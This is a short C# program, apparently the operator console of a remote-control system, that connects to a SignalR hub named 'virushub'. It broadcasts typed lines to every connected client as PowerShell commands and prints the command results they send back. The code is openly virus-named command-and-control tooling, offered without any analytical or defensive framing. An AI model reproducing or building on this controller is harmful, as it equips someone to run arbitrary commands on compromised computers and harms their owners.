using Microsoft.AspNetCore.SignalR.Client;

internal class Program
{
    private static HubConnection? hubConnection;
    private static List<string> messages = [];
    private static string? userInput;
    private static string? messageInput;
    private static async Task Main(string[] args)
    {
        await InitializeVirusAsync();

        while (true)
        {

            Console.WriteLine("输入消息：");
            messageInput = Console.ReadLine();
            await Send(messageInput);
        }
    }


    private static async Task InitializeVirusAsync()
    {
        hubConnection = new HubConnectionBuilder()
            .WithUrl("https://localhost:7127/virushub")
            .Build();

        hubConnection.Closed += async (_) =>
        {
            await Task.Delay(new Random().Next(0, 5) * 1000);
            await hubConnection.StartAsync();
        };

        hubConnection.On<string>("ReceiveMessage", (message) =>
        {
            Console.WriteLine(message);
        });
        hubConnection.On<string>("SendInvokeResultToMaster", (message) =>
        {
            Console.WriteLine(message);
        });

        await hubConnection.StartAsync();
    }

    private static async Task Send(string message)
    {
        if (hubConnection is not null)
        {
            await hubConnection.SendAsync("SendCommandToAll", message + " | Out-String");
        }
    }

    public bool IsConnected =>
        hubConnection?.State == HubConnectionState.Connected;

    public async ValueTask DisposeAsync()
    {
        if (hubConnection is not null)
        {
            await hubConnection.DisposeAsync();
        }
    }
}